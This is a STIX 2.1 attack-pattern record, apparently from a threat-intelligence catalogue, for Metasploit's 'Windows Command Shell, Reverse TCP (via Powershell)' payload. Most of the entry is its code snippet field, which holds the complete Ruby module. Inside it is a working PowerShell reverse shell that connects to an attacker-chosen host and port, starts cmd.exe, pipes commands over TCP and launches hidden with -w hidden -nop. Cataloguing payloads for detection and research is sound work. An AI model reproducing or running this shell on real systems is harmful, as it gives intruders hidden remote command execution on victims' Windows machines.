{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ead6a2e4-d138-4c0b-80b1-5db26a554b7e",
    "created": "2024-08-14T16:33:19.306614Z",
    "modified": "2024-08-14T16:33:19.306618Z",
    "name": "Windows Command Shell, Reverse TCP (via Powershell)",
    "description": "Connect back and create a command shell via Powershell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/windows/reverse_powershell.rb",
            "external_id": "reverse_powershell.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/powershell/reverse.powershell"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 1588\n\n  include Msf::Payload::Single\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n     'Name'          => 'Windows Command Shell, Reverse TCP (via Powershell)',\n     'Description'   => 'Connect back and create a command shell via Powershell',\n     'Author'        =>\n       [\n         'Dave Kennedy', # Original payload from trustedsec on SET\n         'Ben Campbell' # Metasploit module\n       ],\n     'References'    =>\n       [\n         ['URL', 'https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/powershell/reverse.powershell']\n       ],\n     # The powershell code is from SET, copyrighted by TrustedSEC, LLC and BSD licensed -- see https://github.com/trustedsec/social-engineer-toolkit/blob/master/readme/LICENSE\n     'License'       => MSF_LICENSE,\n     'Platform'      => 'win',\n     'Arch'          => ARCH_CMD,\n     'Handler'       => Msf::Handler::ReverseTcp,\n     'Session'       => Msf::Sessions::CommandShell,\n     'PayloadType'   => 'cmd',\n     'RequiredCmd'   => 'powershell',\n     'Payload'       =>\n       {\n         'Offsets' => { },\n         'Payload' => ''\n       }\n    ))\n    register_advanced_options(\n      [\n        OptString.new('PowerShellPath', [true, 'The path to the PowerShell executable', 'powershell'])\n      ]\n    )\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    return super + command_string\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n    lhost = datastore['LHOST']\n    lport = datastore['LPORT']\n    powershell = %Q^\n$a='#{lhost}';\n$b=#{lport};\n$c=New-Object system.net.sockets.tcpclient;\n$nb=New-Object System.Byte[] $c.ReceiveBufferSize;\n$ob=New-Object System.Byte[] 65536;\n$eb=New-Object System.Byte[] 65536;\n$e=new-object System.Text.UTF8Encoding;\n$p=New-Object System.Diagnostics.Process;\n$p.StartInfo.FileName='cmd.exe';\n$p.StartInfo.RedirectStandardInput=1;\n$p.StartInfo.RedirectStandardOutput=1;\n$p.StartInfo.RedirectStandardError=1;\n$p.StartInfo.UseShellExecute=0;\n$q=$p.Start();\n$is=$p.StandardInput;\n$os=$p.StandardOutput;\n$es=$p.StandardError;\n$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);\n$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);\n$c.connect($a,$b);\n$s=$c.GetStream();\nwhile ($true) {\n    start-sleep -m 100;\n    if ($osread.IsCompleted -and $osread.Result -ne 0) {\n      $r=$os.BaseStream.EndRead($osread);\n      $s.Write($ob,0,$r);\n      $s.Flush();\n      $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);\n    }\n    if ($esread.IsCompleted -and $esread.Result -ne 0) {\n      $r=$es.BaseStream.EndRead($esread);\n      $s.Write($eb,0,$r);\n      $s.Flush();\n      $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);\n    }\n    if ($s.DataAvailable) {\n      $r=$s.Read($nb,0,$nb.Length);\n      if ($r -lt 1) {\n          break;\n      } else {\n          $str=$e.GetString($nb,0,$r);\n          $is.write($str);\n      }\n    }\n    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {\n        break;\n    }\n    if ($p.ExitCode -ne $null) {\n        break;\n    }\n}\n^.gsub!(\"\\n\", \"\")\n\n    \"#{datastore['PowerShellPath']} -w hidden -nop -c #{powershell}\"\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}